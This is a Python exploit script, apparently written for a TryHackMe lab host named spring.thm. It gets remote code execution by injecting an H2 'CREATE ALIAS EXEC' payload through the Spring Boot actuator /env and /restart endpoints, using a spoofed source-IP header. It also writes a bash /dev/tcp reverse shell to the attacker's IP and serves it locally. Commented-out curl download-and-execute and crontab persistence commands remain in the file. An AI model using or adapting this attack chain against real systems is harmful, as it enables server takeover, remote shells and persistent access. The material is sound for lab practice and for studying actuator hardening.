import requests
import subprocess
import time
import os
import signal
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

our_ip = "10.6.32.20"
revshell_port = "7777"
url = "https://spring.thm"

def prepare_exploit_file():
    with open('rev.sh', 'w') as f:
        f.write('#!/bin/bash\n')
        f.write(f"bash -c 'bash -i >& /dev/tcp/{our_ip}/{revshell_port} 0>&1'\n")

    p = subprocess.Popen('python3 -m http.server', shell=True)
    return p


def run_cmd(cmd):
    data = {
        'name': 'spring.datasource.hikari.connection-test-query',
        'value': f"CREATE ALIAS EXEC AS CONCAT('void e(String cmd) throws java.io.IOException',HEXTORAW('007b'),'java.lang.Runtime rt= java.lang.Runtime.getRuntime();rt.exec(cmd);',HEXTORAW('007d'));CALL EXEC('{cmd}');"
        #'value': f"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException {{ java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream());  if (s.hasNext()) {{return s.next();}} throw new IllegalArgumentException(); }}');CALL EXEC('{cmd}');"
    }

    headers = {
        'x-9ad42dea0356cb04': '172.16.0.3'
    }

    print(f"Inserting cmd : {cmd}")
    r = requests.post(f"{url}/actuator/env", json=data, headers=headers, verify=False)

    r = requests.post(f"{url}/actuator/restart", headers=headers, verify=False)
    print(r.text)
    print("Command executed")

def kill_server(process, filename="rev.sh"):
    if os.path.exists(filename):
        os.remove(filename)

    time.sleep(1)

    os.killpg(os.getpgid(process.pid), signal.SIGTERM) 
        

if __name__ == "__main__":
    #os.system('bash -c \'pgrep -f "python3 -m http.server" | xargs kill\'')#, shell=True)
    cmd = f"echo yo | /tmp/yolo2"
    #cmd = f"curl http://{our_ip}:8000/rev.sh -o /tmp/rev.sh && (crontab -l ; echo '* * * * * /bin/bash /tmp/rev.sh') | crontab -"
    cmd2 = f"/bin/bash /tmp/rev.sh"
    #http_server_process = prepare_exploit_file()
    run_cmd(cmd)

    print("uploaded script.")
    #input("Press return when you get the request")
    #print("Waiting 10 sec...")
    #time.sleep(10)
    #run_cmd(cmd2)

    time.sleep(5)
    #kill_server(http_server_process)

#cmd = f"bash -c 'bash -i >& /dev/tcp/{our_ip}/7777 0>&1'"
#cmd = f"curl http://{our_ip}:8000/from_python_launcher"
#cmd = f"curl http://{our_ip}:8000/rev2.sh -o /tmp/rev2.sh && ( /bin/bash /tmp/rev2.sh ) &"
#cmd = f"curl http://{our_ip}:8000/rev2.sh -o /tmp/rev2.sh && curl http://{our_ip}:8000/toto"
#cmd1 = f"curl http://{our_ip}:8000/rev2.sh -o /tmp/rev2.sh"
#cmd2 = f"/bin/bash /tmp/rev2.sh"

